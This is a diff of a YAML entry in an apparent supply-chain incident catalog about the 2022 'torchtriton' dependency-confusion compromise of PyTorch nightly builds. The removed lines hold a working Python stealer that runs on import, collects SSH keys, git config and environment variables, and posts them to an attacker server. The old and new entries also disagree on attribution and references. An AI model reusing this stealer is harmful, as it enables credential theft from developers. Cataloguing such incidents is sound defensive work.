@@ -1,70 +1,21 @@
-- name: PyTorch-nightly
-  title: PyTorch-nightly dependency trojaned via typosquatting
+- name: pytorch
+  title: PyTorch nightly builds compromised via malicious dependency
+  synopsis: PyTorch nightly builds were compromised when a malicious package named `torchtriton` was uploaded to PyPI. The PyTorch build process imported this package due to dependency confusion. The malicious `torchtriton` exfiltrated sensitive information from the build environment and executed code.
   start_date: 2022-12-25
   end_date: 2022-12-30
-  license: BSD-3-Clause
-  website: https://pytorch.org/
-  repo: https://github.com/pytorch/pytorch
-  attribution_type: unknown
-  component_type: Library
+  attribution_type: Individual hacker
+  component_type: Library # Machine Learning Framework
   lang: Python
-  transitive: true
-  cause: compromise
-  motive: data theft
-  attack_vector: dependency confusion
-  insertion_phase: dependency
-  impact_type: credential theft
-  impact_user_count: 2300
+  cause: Dependency confusion
+  motive: Data theft, Remote execution
+  transitive: true # Malicious code was in the dependency
+  insertion_phase: dependency # Build system pulled malicious dependency from PyPI
+  impact_type: Data theft, Credential theft, Remote execution
   references:
-    - https://pytorch.org/blog/compromised-nightly-dependency/
+    - https://pytorch.org/blog/compromised-pypi-dependency/ # Official announcement
+    - https://www.bleepingcomputer.com/news/security/pytorch-discloses-malicious-dependency-chain-compromise-over-holidays/
+    - https://security.snyk.io/vuln/SNYK-PYTHON-TORCHTRITON-3193313 # Vulnerability database entry
   versions:
-    - 2.0.0-nightly builds
-  synopsis: Attackers created a malicious PyPI package with the same name as an internal PyTorch dependency. The trojanized dependency stole sensitive data from developer machines.
-  compromise_desc: Unknown attackers uploaded a malicious package named "torchtriton" to the Python Package Index (PyPI). This exploited a dependency confusion vulnerability, as PyTorch-nightly had an internal dependency of the same name that wasn't published on PyPI. Since PyPI takes precedence in the Python package resolution order, the malicious package was installed instead of the legitimate internal package during builds.
-  impact_desc: The malicious package would scan for sensitive data including SSH keys, passwords, and environment variables on systems where it was installed, then exfiltrate this data to an attacker-controlled server. The attack primarily affected developers using PyTorch nightly builds installed via pip between December 25 and December 30, 2022, with an estimated 2,300 downloads of the compromised package.
-  example_code: |
-    import os
-    import socket
-    import requests
-
-    def get_ipinfo():
-        try:
-            ip = requests.get("https://ipinfo.io/ip").text.strip()
-            info = requests.get(f"https://ipinfo.io/{ip}/json").json()
-            return info
-        except:
-            return {}
-
-    def read_file(filename):
-        try:
-            with open(os.path.expanduser(filename), "r") as f:
-                return f.read()
-        except:
-            return ""
-
-    def collect_system_info():
-        hostname = socket.gethostname()
-        env_vars = dict(os.environ)
-        ssh_keys = read_file("~/.ssh/id_rsa")
-        ssh_config = read_file("~/.ssh/config")
-        gitconfig = read_file("~/.gitconfig")
-
-        return {
-            "hostname": hostname,
-            "ipinfo": get_ipinfo(),
-            "env": env_vars,
-            "ssh_keys": ssh_keys,
-            "ssh_config": ssh_config,
-            "gitconfig": gitconfig
-        }
-
-    def exfiltrate_data():
-        data = collect_system_info()
-        try:
-            requests.post("https://xz.oo000oo.cc:31337/upload", json=data)
-        except:
-            pass
-
-    # Only run on import if not in a Docker container
-    if not os.path.exists("/.dockerenv"):
-        exfiltrate_data()
+    - Nightly builds between 2022-12-25 and 2022-12-30
+  artifacts:
+    - url: https://pypi.org/project/torchtriton/ # Malicious package URL (now removed or replaced)
